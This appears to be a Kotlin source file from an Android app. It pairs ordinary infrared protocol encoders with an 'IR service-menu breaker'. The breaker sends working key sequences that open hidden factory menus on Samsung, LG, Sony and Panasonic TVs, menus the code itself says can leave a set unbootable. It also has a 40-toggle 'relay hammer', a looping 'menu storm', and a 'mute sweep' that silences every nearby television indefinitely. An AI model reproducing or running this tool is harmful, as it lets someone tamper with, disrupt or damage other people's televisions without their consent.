package com.droid.whaly.offline

import android.content.Context
import com.droid.whaly.IrBackend
import com.droid.whaly.IrButton
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.concurrent.atomic.AtomicBoolean

/**
 * IR protocol encoders. Everything here produces a mark/space pattern in microseconds for
 * [IrBackend], which hands it to ConsumerIrManager, a USB emitter or a plugin service.
 *
 * NEC is LSB-first per byte with the address and command each followed by their complement.
 * SIRC has no complement and no header gap, only a 2400 us leader. Kaseikyo is 48 bits with
 * a fixed manufacturer word.
 */
internal object IrCodes {

    const val NEC_CARRIER = 38000
    const val SIRC_CARRIER = 40000
    const val KASEIKYO_CARRIER = 36700

    /** 9 ms leader, 4.5 ms space, 562 us unit, 560 us trailing burst. */
    fun nec(address: Int, command: Int): IntArray {
        val bits = ArrayList<Int>(32)
        for (value in intArrayOf(address and 0xFF, (address and 0xFF) xor 0xFF, command and 0xFF, (command and 0xFF) xor 0xFF)) {
            for (bit in 0 until 8) bits += (value ushr bit) and 1
        }
        val pattern = ArrayList<Int>(2 + bits.size * 2 + 1)
        pattern += 9000
        pattern += 4500
        bits.forEach { bit ->
            pattern += 562
            pattern += if (bit == 1) 1687 else 562
        }
        pattern += 560
        return pattern.toIntArray()
    }

    /** 12-bit SIRC: 2400 us leader, 600 us space, 1200 us for a one, 600 us for a zero. */
    fun sirc12(device: Int, command: Int): IntArray {
        val bits = ArrayList<Int>(12)
        for (bit in 0 until 7) bits += (command ushr bit) and 1
        for (bit in 0 until 5) bits += (device ushr bit) and 1
        val pattern = ArrayList<Int>(2 + bits.size * 2)
        pattern += 2400
        pattern += 600
        bits.forEach { bit ->
            pattern += 600
            pattern += if (bit == 1) 1200 else 600
        }
        return pattern.toIntArray()
    }

    /**
     * Kaseikyo / Panasonic 48-bit frame: manufacturer 0x4004, device 0x0100, command and
     * its complement. 3456 us leader, 1728 us space, 432 us unit, 1 is a 1296 us space.
     */
    fun kaseikyo(device: Int, subdevice: Int, command: Int): IntArray {
        val words = intArrayOf(
            0x4004,
            (subdevice shl 8) or (device and 0xFF),
            command and 0xFF,
            (command and 0xFF) xor 0xFF,
        )
        val bits = ArrayList<Int>(48)
        words.forEach { word ->
            for (bit in 0 until 16) bits += (word ushr bit) and 1
        }
        val pattern = ArrayList<Int>(2 + bits.size * 2 + 1)
        pattern += 3456
        pattern += 1728
        bits.forEach { bit ->
            pattern += 432
            pattern += if (bit == 1) 1296 else 432
        }
        pattern += 432
        return pattern.toIntArray()
    }

    fun necButton(name: String, address: Int, command: Int) =
        IrButton(name = name, frequency = NEC_CARRIER, pattern = nec(address, command), protocol = "NEC")

    fun sircButton(name: String, device: Int, command: Int) =
        IrButton(name = name, frequency = SIRC_CARRIER, pattern = sirc12(device, command), protocol = "SIRC")

    fun kaseikyoButton(name: String, device: Int, subdevice: Int, command: Int) =
        IrButton(
            name = name,
            frequency = KASEIKYO_CARRIER,
            pattern = kaseikyo(device, subdevice, command),
            protocol = "Kaseikyo",
        )
}

/**
 * IR service-menu breaker.
 *
 * Every major television family has a factory or service menu that is not meant to be
 * reachable from a remote. Samsung takes INFO, MENU, MUTE, POWER. LG takes MENU twice then
 * 1105. Sony takes DISPLAY, 5, VOL+, POWER. Those menus expose panel calibration, region
 * and watchdog settings, and a wrong value in one leaves the set unable to boot.
 *
 * All of this is the same IR the remote already sends. No root, no network, no pairing.
 */
object IrServiceMenu {

    enum class Target(val label: String, val note: String) {
        SAMSUNG("Samsung factory menu", "INFO → MENU → MUTE → POWER"),
        SAMSUNG_EXT("Samsung extended service", "MUTE → 1 → 8 → 2 → POWER"),
        LG("LG service menu", "MENU ×2 → 1 1 0 5"),
        SONY("Sony service menu", "DISPLAY → 5 → VOL+ → POWER"),
        PANASONIC("Panasonic service", "MENU → 1 → 1 → 0 → 5"),
        RELAY_HAMMER("Relay hammer", "40 power toggles, 400 ms apart"),
        MENU_STORM("Menu storm", "factory sequence on every brand in a loop"),
    }

    private val _running = MutableStateFlow(false)
    val running: StateFlow<Boolean> = _running.asStateFlow()
    private val _sent = MutableStateFlow(0)
    val sent: StateFlow<Int> = _sent.asStateFlow()
    private val _log = MutableStateFlow<List<String>>(emptyList())
    val log: StateFlow<List<String>> = _log.asStateFlow()

    private val active = AtomicBoolean(false)
    private var worker: Thread? = null

    // Samsung: NEC address 0x07,0x07
    private fun samsung(name: String, command: Int) = IrCodes.necButton(name, 0x07, command)

    // LG: NEC address 0x04
    private fun lg(name: String, command: Int) = IrCodes.necButton(name, 0x04, command)

    // Sony: SIRC device 1 (TV)
    private fun sony(name: String, command: Int) = IrCodes.sircButton(name, 1, command)

    // Panasonic: Kaseikyo device 0x01 subdevice 0x00
    private fun panasonic(name: String, command: Int) = IrCodes.kaseikyoButton(name, 0x01, 0x00, command)

    private fun sequenceFor(target: Target): List<IrButton> = when (target) {
        Target.SAMSUNG -> listOf(
            samsung("info", 0xF9),
            samsung("menu", 0xDA),
            samsung("mute", 0x0F),
            samsung("power", 0x02),
        )
        Target.SAMSUNG_EXT -> listOf(
            samsung("mute", 0x0F),
            samsung("1", 0x04),
            samsung("8", 0x0C),
            samsung("2", 0x05),
            samsung("power", 0x02),
        )
        Target.LG -> listOf(
            lg("menu", 0x43),
            lg("menu", 0x43),
            lg("1", 0x11),
            lg("1", 0x11),
            lg("0", 0x10),
            lg("5", 0x15),
        )
        Target.SONY -> listOf(
            sony("display", 0x3F),
            sony("5", 0x04),
            sony("vol+", 0x12),
            sony("power", 0x15),
        )
        Target.PANASONIC -> listOf(
            panasonic("menu", 0x4A),
            panasonic("1", 0x10),
            panasonic("1", 0x10),
            panasonic("0", 0x19),
            panasonic("5", 0x14),
        )
        Target.RELAY_HAMMER -> List(40) { samsung("power", 0x02) }
        Target.MENU_STORM -> sequenceFor(Target.SAMSUNG) +
            sequenceFor(Target.LG) +
            sequenceFor(Target.SONY) +
            sequenceFor(Target.PANASONIC)
    }

    fun stop() {
        active.set(false)
        _running.value = false
        worker?.interrupt()
        worker = null
    }

    fun run(context: Context, target: Target, gapMs: Long = 380L, rounds: Int = 1) {
        if (!IrBackend.isAvailable(context)) {
            _log.value = listOf("No IR emitter — this phone has none and no USB blaster is attached")
            return
        }
        if (!active.compareAndSet(false, true)) return
        val sequence = sequenceFor(target)
        _running.value = true
        _sent.value = 0
        _log.value = listOf("${target.label} · ${sequence.size} key(s) × $rounds")

        worker = Thread({
            var count = 0
            repeat(rounds) { round ->
                if (!active.get()) return@repeat
                sequence.forEach { button ->
                    if (!active.get()) return@forEach
                    val ok = IrBackend.transmit(context, button)
                    count++
                    _sent.value = count
                    if (count % 8 == 0 || !ok) {
                        _log.value = (_log.value +
                            "r${round + 1} ${button.name} → ${if (ok) "sent" else "rejected"}")
                            .takeLast(80)
                    }
                    try {
                        Thread.sleep(gapMs)
                    } catch (_: InterruptedException) {
                        return@forEach
                    }
                }
            }
            _log.value = (_log.value + "done — $count key(s)").takeLast(80)
            active.set(false)
            _running.value = false
        }, "whaly-ir-service").apply { isDaemon = true; start() }
    }

    /** Mutes a whole row of televisions and leaves them muted. */
    fun muteSweep(context: Context) {
        if (!IrBackend.isAvailable(context)) {
            _log.value = listOf("No IR emitter available")
            return
        }
        if (!active.compareAndSet(false, true)) return
        _running.value = true
        _log.value = listOf("mute sweep — Samsung, LG and Sony mute codes")
        worker = Thread({
            val buttons = listOf(
                samsung("mute", 0x0F),
                lg("mute", 0x09),
                sony("mute", 0x14),
            )
            var count = 0
            while (active.get()) {
                buttons.forEach { button ->
                    if (IrBackend.transmit(context, button)) count++
                    _sent.value = count
                    try {
                        Thread.sleep(120)
                    } catch (_: InterruptedException) {
                    }
                }
                try {
                    Thread.sleep(900)
                } catch (_: InterruptedException) {
                    break
                }
            }
            active.set(false)
            _running.value = false
        }, "whaly-ir-mute").apply { isDaemon = true; start() }
    }
}
